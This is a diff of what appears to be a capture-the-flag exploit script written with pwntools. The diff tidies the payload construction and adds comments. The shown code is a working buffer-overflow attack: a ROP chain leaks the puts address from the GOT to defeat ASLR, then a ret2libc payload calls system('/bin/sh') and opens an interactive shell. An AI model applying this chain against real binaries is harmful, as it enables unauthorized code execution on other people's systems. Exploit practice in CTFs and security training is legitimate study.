@@ -60,38 +60,34 @@ io = start()
 
 # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
+# ROP gadget: puts(puts@GOT) => leak libc
 poprdi = 0x000000000040159f #: pop rdi ; ret
-
 padding = b"a"*0x28
-
 payload = flat(
     padding,
-    p64(poprdi),
-    p64(exe.got['puts']),
-    p64(exe.plt['puts']),
-    p64(exe.sym['main'])
+    poprdi,
+    exe.got['puts'],
+    exe.plt['puts'],
+    exe.sym['main']
 )
-
 s(payload)
-
 io.recvuntil(b"testing..\n")
-
 leaked_puts = u64(io.recv(6).ljust(8, b'\x00'))
 libc.address = leaked_puts - libc.sym['puts']
 info(f"leaked puts: {hex(leaked_puts)}")
 success(f"libc.address: {hex(libc.address)}")
-
 # -------------------
 
+# ret2libc => system(b'/bin/sh\x00')
 payload = flat(
     padding,
-    p64(poprdi),
-    p64(next(libc.search(b'/bin/sh\x00'))),
-    p64(0x00401588), # ret
-    p64(libc.sym['system'])
+    poprdi,
+    next(libc.search(b'/bin/sh\x00')),
+    0x00401588, # ret
+    libc.sym['system']
 )
-
 s(payload)
+# -------------------
 
 io.interactive()
 
